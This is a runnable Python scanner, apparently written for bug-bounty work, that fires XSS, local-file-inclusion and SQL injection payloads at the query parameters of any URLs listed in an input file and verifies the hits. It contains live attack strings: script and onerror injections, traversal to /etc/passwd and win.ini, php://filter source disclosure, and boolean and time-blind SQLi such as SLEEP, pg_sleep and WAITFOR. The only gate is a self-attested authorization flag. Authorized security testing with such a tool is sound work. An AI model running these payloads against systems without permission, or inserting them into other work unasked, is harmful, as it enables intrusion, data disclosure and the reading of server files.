#!/usr/bin/env python3
"""
Deep, low-false-positive XSS / LFI / SQLi testing helper.

Use ONLY against targets you have explicit written authorization to test
(e.g. an active HackerOne / bug bounty program's in-scope assets, or your
own lab).

Why this version differs from a naive fuzzer:
  * XSS   - verified by ACTUALLY EXECUTING the response in a headless
            browser (Playwright/Chromium) and checking a unique marker
            fired. Falls back to reflection heuristic (clearly labeled
            UNVERIFIED) only if Playwright isn't installed.
  * LFI   - every hit requires BOTH a strong content indicator on the real
            payload AND the ABSENCE of that same indicator on a structurally
            identical "negative control" payload (traversal depth kept the
            same, target filename swapped for a random nonexistent one).
            php://filter hits are additionally verified by base64-decoding
            the response and checking for real source-code markers.
  * SQLi  - error-based hits require the signature to be present on the
            payload response AND absent from the untouched baseline.
            Boolean-blind hits require the TRUE/FALSE difference to exceed
            the natural noise floor measured between two FALSE requests.
            Time-blind hits require the delay to track the requested sleep
            duration specifically (payload vs. a same-shape zero-delay
            control), reproduced across repeated trials, not just "slow".

Findings are labeled CONFIRMED or SUSPECTED. By default only CONFIRMED
findings are printed/reported; pass --include-suspected to see the rest.
Nothing here replaces manual verification and understanding of impact
before you write a report.

Install:
    pip install requests
    pip install playwright && playwright install chromium   # optional, for verified XSS

Usage:
    python3 vuln_tester_deep.py urls.txt --i-am-authorized --cookie "session=abc123"
"""

import argparse
import base64
import difflib
import json
import re
import statistics
import sys
import time
import uuid
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

import requests

requests.packages.urllib3.disable_warnings()

try:
    from playwright.sync_api import sync_playwright
    HAVE_PLAYWRIGHT = True
except ImportError:
    HAVE_PLAYWRIGHT = False

DEFAULT_DELAY = 0.4
TIMEOUT = 15
SLEEP_SECONDS = 5

# ---------------------------------------------------------------------------
# Payload sets
# ---------------------------------------------------------------------------

XSS_TEMPLATES = [
    '<script>window.__xss_{c}=1</script>',
    '"><script>window.__xss_{c}=1</script>',
    "'><script>window.__xss_{c}=1</script>",
    '<img src=x onerror="window.__xss_{c}=1">',
    '"><img src=x onerror="window.__xss_{c}=1">',
    '<svg onload="window.__xss_{c}=1">',
]

LFI_TARGETS = [
    # (depth-prefix, real filename, control filename, strong indicator)
    ('../../../../../../', 'etc/passwd', 'etc/nonexistent_{r}', re.compile(r'root:.*:0:0:.*:.*:')),
    ('....//....//....//....//', 'etc/passwd', 'etc/nonexistent_{r}', re.compile(r'root:.*:0:0:.*:.*:')),
    ('../../../../../../', 'windows/win.ini', 'windows/nonexistent_{r}.ini', re.compile(r'\[fonts\]', re.I)),
]

LFI_PHP_FILTER = 'php://filter/convert.base64-encode/resource=index'
LFI_PHP_FILTER_CONTROL = 'php://filter/convert.base64-encode/resource=nonexistent_{r}'
SOURCE_MARKERS = re.compile(r'<\?php|function\s+\w+\s*\(|require|include|SELECT .* FROM', re.I)

SQLI_ERROR_PAYLOADS = ["'", '"', "')", '")']
SQLI_ERROR_SIGNATURES = [
    re.compile(r'you have an error in your sql syntax', re.I),
    re.compile(r'warning: mysql', re.I),
    re.compile(r'unclosed quotation mark', re.I),
    re.compile(r'quoted string not properly terminated', re.I),
    re.compile(r'pg_query\(\)', re.I),
    re.compile(r'sqlite3\.OperationalError', re.I),
    re.compile(r'ORA-\d{5}', re.I),
    re.compile(r'Microsoft OLE DB Provider for SQL Server', re.I),
    re.compile(r'SQLSTATE\[', re.I),
    re.compile(r'psycopg2\.', re.I),
]

SQLI_BOOL_TRUE = ["' OR '1'='1", "\" OR \"1\"=\"1"]
SQLI_BOOL_FALSE = ["' AND '1'='2", "\" AND \"1\"=\"2"]

SQLI_TIME_PAYLOADS = {
    "MySQL/MariaDB": ("' OR SLEEP({n})-- -", "' OR SLEEP(0)-- -"),
    "PostgreSQL": ("'; SELECT pg_sleep({n})-- -", "'; SELECT pg_sleep(0)-- -"),
    "MSSQL": ("'; WAITFOR DELAY '0:0:{n}'--", "'; WAITFOR DELAY '0:0:0'--"),
}


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

@dataclass
class Finding:
    vuln_type: str
    confidence: str  # CONFIRMED | SUSPECTED
    url: str
    param: str
    payload: str
    evidence: list = field(default_factory=list)

    def to_dict(self):
        return {**self.__dict__, "evidence": self.evidence}


def inject_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    query = dict(parse_qsl(parsed.query, keep_blank_values=True))
    query[param] = value
    return urlunparse(parsed._replace(query=urlencode(query, safe="/:")))


def get_params(url: str):
    return [k for k, _ in parse_qsl(urlparse(url).query, keep_blank_values=True)]


def similarity(a: str, b: str) -> float:
    if not a and not b:
        return 1.0
    return difflib.SequenceMatcher(None, a, b).quick_ratio()


# ---------------------------------------------------------------------------
# Core tester
# ---------------------------------------------------------------------------

class DeepTester:
    def __init__(self, session, delay, reps, include_suspected, browser_ctx=None):
        self.session = session
        self.delay = delay
        self.reps = max(1, reps)
        self.include_suspected = include_suspected
        self.browser_ctx = browser_ctx
        self.findings = []

    def _get(self, url):
        time.sleep(self.delay)
        try:
            return self.session.get(url, timeout=TIMEOUT, verify=False)
        except requests.RequestException:
            return None

    def _add(self, vuln_type, confidence, url, param, payload, evidence):
        if confidence == "SUSPECTED" and not self.include_suspected:
            evidence = evidence + ["(suspected finding suppressed by default; rerun with --include-suspected)"]
        self.findings.append(Finding(vuln_type, confidence, url, param, payload, evidence))

    # ---- XSS -------------------------------------------------------------

    def test_xss(self, url, param):
        canary = uuid.uuid4().hex[:10]
        for template in XSS_TEMPLATES:
            payload = template.format(c=canary)
            test_url = inject_param(url, param, payload)

            if self.browser_ctx is not None:
                executed = self._xss_browser_check(test_url, canary)
                if executed:
                    self._add("XSS", "CONFIRMED", url, param, payload,
                              [f"headless browser executed injected JS; window.__xss_{canary} was set after page load"])
                    return
            else:
                resp = self._get(test_url)
                if resp is not None and payload in resp.text:
                    self._add("XSS", "SUSPECTED", url, param, payload,
                              ["payload string reflected verbatim in HTML (UNVERIFIED - no browser execution check available; "
                               "install playwright for confirmation: pip install playwright && playwright install chromium)"])
                    return

    def _xss_browser_check(self, test_url, canary):
        page = self.browser_ctx.new_page()
        page.on("dialog", lambda d: d.dismiss())
        try:
            page.goto(test_url, wait_until="load", timeout=TIMEOUT * 1000)
            page.wait_for_timeout(300)
            marker = page.evaluate(f"() => window.__xss_{canary} === 1")
            return bool(marker)
        except Exception:
            return False
        finally:
            page.close()

    # ---- LFI ---------------------------------------------------------

    def test_lfi(self, url, param):
        rand = uuid.uuid4().hex[:8]

        for prefix, real_file, control_tmpl, indicator in LFI_TARGETS:
            real_payload = prefix + real_file
            control_payload = prefix + control_tmpl.format(r=rand)

            r_real = self._get(inject_param(url, param, real_payload))
            r_ctrl = self._get(inject_param(url, param, control_payload))
            if r_real is None or r_ctrl is None:
                continue

            real_match = bool(indicator.search(r_real.text))
            ctrl_match = bool(indicator.search(r_ctrl.text))

            if real_match and not ctrl_match:
                self._add("LFI", "CONFIRMED", url, param, real_payload,
                          [f"indicator '{indicator.pattern}' matched on real payload",
                           "identical-depth control payload (nonexistent file) did NOT match -> rules out static/boilerplate content",
                           f"status: real={r_real.status_code} control={r_ctrl.status_code}, "
                           f"len: real={len(r_real.text)} control={len(r_ctrl.text)}"])
                return
            elif real_match and ctrl_match:
                self._add("LFI", "SUSPECTED", url, param, real_payload,
                          ["indicator matched on BOTH real and control payload - likely false positive "
                           "(e.g. page always contains this text); needs manual review"])

        # php://filter source-disclosure check
        real_payload = LFI_PHP_FILTER
        control_payload = LFI_PHP_FILTER_CONTROL.format(r=rand)
        r_real = self._get(inject_param(url, param, real_payload))
        r_ctrl = self._get(inject_param(url, param, control_payload))
        if r_real is not None and r_ctrl is not None:
            decoded = self._try_b64_decode(r_real.text)
            if decoded and SOURCE_MARKERS.search(decoded):
                ctrl_decoded = self._try_b64_decode(r_ctrl.text) or ""
                if not SOURCE_MARKERS.search(ctrl_decoded):
                    self._add("LFI", "CONFIRMED", url, param, real_payload,
                              ["php://filter base64 payload decoded to content containing source-code markers "
                               "(e.g. '<?php', function defs, SQL); control (nonexistent resource) did not decode to source",
                               f"decoded snippet: {decoded[:200]!r}"])

    @staticmethod
    def _try_b64_decode(text):
        candidate = text.strip()
        # only attempt on plausible base64 blobs to avoid noise
        if not candidate or len(candidate) < 20:
            return None
        cleaned = re.sub(r'\s+', '', candidate)
        if not re.fullmatch(r'[A-Za-z0-9+/=]+', cleaned[:2000]):
            return None
        try:
            padded = cleaned + '=' * (-len(cleaned) % 4)
            return base64.b64decode(padded, validate=False).decode('utf-8', errors='ignore')
        except Exception:
            return None

    # ---- SQLi --------------------------------------------------------

    def test_sqli(self, url, param, baseline_text):
        if self._test_sqli_error(url, param, baseline_text):
            return
        if self._test_sqli_boolean(url, param):
            return
        self._test_sqli_time(url, param)

    def _test_sqli_error(self, url, param, baseline_text):
        for payload in SQLI_ERROR_PAYLOADS:
            resp = self._get(inject_param(url, param, payload))
            if resp is None:
                continue
            for sig in SQLI_ERROR_SIGNATURES:
                hit = sig.search(resp.text)
                if hit and not sig.search(baseline_text):
                    self._add("SQLi-error", "CONFIRMED", url, param, payload,
                              [f"db error signature '{sig.pattern}' appeared only after injecting payload, "
                               "absent from unmodified baseline response"])
                    return True
                elif hit and sig.search(baseline_text):
                    self._add("SQLi-error", "SUSPECTED", url, param, payload,
                              ["error signature present in BOTH payload response and baseline - likely unrelated to injection"])
        return False

    def _test_sqli_boolean(self, url, param):
        # noise floor: two structurally-identical FALSE requests
        r_false1 = self._get(inject_param(url, param, SQLI_BOOL_FALSE[0]))
        r_false2 = self._get(inject_param(url, param, SQLI_BOOL_FALSE[1]))
        if r_false1 is None or r_false2 is None:
            return False
        noise_sim = similarity(r_false1.text, r_false2.text)

        for true_payload in SQLI_BOOL_TRUE:
            r_true = self._get(inject_param(url, param, true_payload))
            if r_true is None:
                continue
            true_vs_false_sim = similarity(r_true.text, r_false1.text)

            # require the TRUE/FALSE difference to be clearly larger than the
            # FALSE/FALSE noise floor, and require it to reproduce
            if true_vs_false_sim < noise_sim - 0.15 and r_true.status_code == r_false1.status_code:
                r_true_repeat = self._get(inject_param(url, param, true_payload))
                repeat_sim = similarity(r_true_repeat.text, r_true.text) if r_true_repeat else 0
                if repeat_sim > 0.98:
                    self._add("SQLi-boolean", "CONFIRMED", url, param,
                              f"TRUE={true_payload} vs FALSE={SQLI_BOOL_FALSE[0]}",
                              [f"TRUE/FALSE similarity={true_vs_false_sim:.2f} vs FALSE/FALSE noise floor={noise_sim:.2f}",
                               f"TRUE response reproduced on repeat (self-similarity={repeat_sim:.2f})"])
                    return True
                else:
                    self._add("SQLi-boolean", "SUSPECTED", url, param,
                              f"TRUE={true_payload} vs FALSE={SQLI_BOOL_FALSE[0]}",
                              ["initial diff looked significant but did not reproduce on repeat - likely dynamic "
                               "page content (ads/timestamps/csrf tokens), not boolean-based SQLi"])
        return False

    def _test_sqli_time(self, url, param):
        # baseline latency noise floor from the unmodified URL
        baseline_times = []
        for _ in range(self.reps):
            t0 = time.time()
            self._get(url)
            baseline_times.append(time.time() - t0)
        base_median = statistics.median(baseline_times)
        base_stdev = statistics.pstdev(baseline_times) if len(baseline_times) > 1 else 0.5

        for dbname, (sleep_tmpl, zero_tmpl) in SQLI_TIME_PAYLOADS.items():
            deltas = []
            for _ in range(self.reps):
                zero_payload = zero_tmpl
                sleep_payload = sleep_tmpl.format(n=SLEEP_SECONDS)

                t0 = time.time()
                r_zero = self._get(inject_param(url, param, zero_payload))
                t_zero = time.time() - t0

                t0 = time.time()
                r_sleep = self._get(inject_param(url, param, sleep_payload))
                t_sleep = time.time() - t0

                if r_zero is None or r_sleep is None:
                    continue
                deltas.append(t_sleep - t_zero)

            if not deltas:
                continue
            med_delta = statistics.median(deltas)
            consistent = all(d >= SLEEP_SECONDS * 0.6 for d in deltas)

            # delay must track the requested sleep duration specifically,
            # not just be "slower than usual"
            if consistent and (SLEEP_SECONDS * 0.6) <= med_delta <= (SLEEP_SECONDS * 2.5):
                self._add("SQLi-time", "CONFIRMED", url, param, sleep_tmpl.format(n=SLEEP_SECONDS),
                          [f"{dbname}: sleep-vs-zero-delay delta median={med_delta:.1f}s across {len(deltas)} trial(s) "
                           f"(all trials >= {SLEEP_SECONDS*0.6:.1f}s)",
                           f"baseline page latency median={base_median:.2f}s (stdev={base_stdev:.2f}s) - delta far exceeds normal jitter"])
                return True
        return False

    # ---- driver ------------------------------------------------------

    def run(self, url, checks):
        params = get_params(url)
        if not params:
            return
        baseline_resp = self._get(url)
        baseline_text = baseline_resp.text if baseline_resp is not None else ""

        for param in params:
            if "xss" in checks:
                self.test_xss(url, param)
            if "lfi" in checks:
                self.test_lfi(url, param)
            if "sqli" in checks:
                self.test_sqli(url, param, baseline_text)


def load_urls(path):
    with open(path) as f:
        return [line.strip() for line in f if line.strip() and not line.startswith("#")]


def main():
    parser = argparse.ArgumentParser(description="Deep XSS/LFI/SQLi testing helper with negative-control verification")
    parser.add_argument("urls", help="Path to file with target URLs (one per line, each must include query params)")
    parser.add_argument("--checks", default="xss,lfi,sqli", help="Comma-separated subset: xss,lfi,sqli")
    parser.add_argument("--cookie", help="Cookie header value to authenticate as a test account")
    parser.add_argument("--header", action="append", default=[], help="Extra header 'Name: Value' (repeatable)")
    parser.add_argument("--delay", type=float, default=DEFAULT_DELAY, help="Delay between requests in seconds")
    parser.add_argument("--concurrency", type=int, default=3)
    parser.add_argument("--reps", type=int, default=2, help="Repeat trials for boolean/time-based SQLi to confirm consistency")
    parser.add_argument("--include-suspected", action="store_true", help="Also report lower-confidence SUSPECTED findings")
    parser.add_argument("--no-browser", action="store_true", help="Disable Playwright browser XSS verification even if installed")
    parser.add_argument("--chromium-path", help="Explicit path to a Chromium/Chrome executable (use if 'playwright install' can't download one in your environment)")
    parser.add_argument("--output", default="findings.json")
    parser.add_argument(
        "--i-am-authorized",
        action="store_true",
        help="Required: confirms you have explicit permission (e.g. an in-scope bug bounty program) to test these targets",
    )
    args = parser.parse_args()

    if not args.i_am_authorized:
        print(
            "Refusing to run: pass --i-am-authorized to confirm you have explicit "
            "permission (e.g. an active, in-scope HackerOne program) to test these targets.",
            file=sys.stderr,
        )
        sys.exit(1)

    checks = {c.strip().lower() for c in args.checks.split(",")}
    urls = load_urls(args.urls)
    urls_with_params = [u for u in urls if get_params(u)]
    skipped = len(urls) - len(urls_with_params)
    if skipped:
        print(f"[!] Skipping {skipped} URL(s) with no query parameters.", file=sys.stderr)
    if not urls_with_params:
        print("No URLs with query parameters found in input file.", file=sys.stderr)
        sys.exit(1)

    session = requests.Session()
    if args.cookie:
        session.headers["Cookie"] = args.cookie
    for h in args.header:
        name, _, value = h.partition(":")
        session.headers[name.strip()] = value.strip()
    session.headers.setdefault("User-Agent", "Mozilla/5.0 (authorized-security-testing)")

    use_browser = HAVE_PLAYWRIGHT and "xss" in checks and not args.no_browser
    if "xss" in checks and not HAVE_PLAYWRIGHT:
        print("[!] Playwright not installed - XSS results will be UNVERIFIED reflection heuristics only.\n"
              "    For confirmed results: pip install playwright && playwright install chromium\n", file=sys.stderr)

    all_findings = []

    def run_all(pw_ctx):
        tester = DeepTester(session, args.delay, args.reps, args.include_suspected, browser_ctx=pw_ctx)
        if pw_ctx is not None:
            # Playwright's sync API is bound to the thread that created it -
            # a thread pool (even with 1 worker) hands the call to a *different*
            # thread and breaks. Run sequentially on the main thread instead.
            for u in urls_with_params:
                tester.run(u, checks)
        else:
            with ThreadPoolExecutor(max_workers=args.concurrency) as pool:
                list(pool.map(lambda u: tester.run(u, checks), urls_with_params))
        return tester.findings

    if use_browser:
        with sync_playwright() as p:
            launch_kwargs = {"headless": True}
            if args.chromium_path:
                launch_kwargs["executable_path"] = args.chromium_path
            browser = p.chromium.launch(**launch_kwargs)
            ctx = browser.new_context(ignore_https_errors=True)
            extra_headers = dict(session.headers)
            ctx.set_extra_http_headers(extra_headers)
            all_findings = run_all(ctx)
            browser.close()
    else:
        all_findings = run_all(None)

    reportable = [f for f in all_findings if f.confidence == "CONFIRMED" or args.include_suspected]

    with open(args.output, "w") as f:
        json.dump([fnd.to_dict() for fnd in all_findings], f, indent=2)

    confirmed = [f for f in reportable if f.confidence == "CONFIRMED"]
    suspected = [f for f in reportable if f.confidence == "SUSPECTED"]

    if confirmed:
        print(f"\n[+] {len(confirmed)} CONFIRMED finding(s):\n")
        for fnd in confirmed:
            print(f"  [{fnd.vuln_type}] {fnd.url}  param={fnd.param}")
            print(f"      payload : {fnd.payload}")
            for e in fnd.evidence:
                print(f"      evidence: {e}")
            print()
    else:
        print("\n[-] No CONFIRMED findings.")

    if suspected:
        print(f"[~] {len(suspected)} SUSPECTED (lower-confidence) finding(s) - review manually:\n")
        for fnd in suspected:
            print(f"  [{fnd.vuln_type}] {fnd.url}  param={fnd.param}  payload={fnd.payload}")

    print(f"\nFull report (including suppressed items) written to {args.output}")


if __name__ == "__main__":
    main()
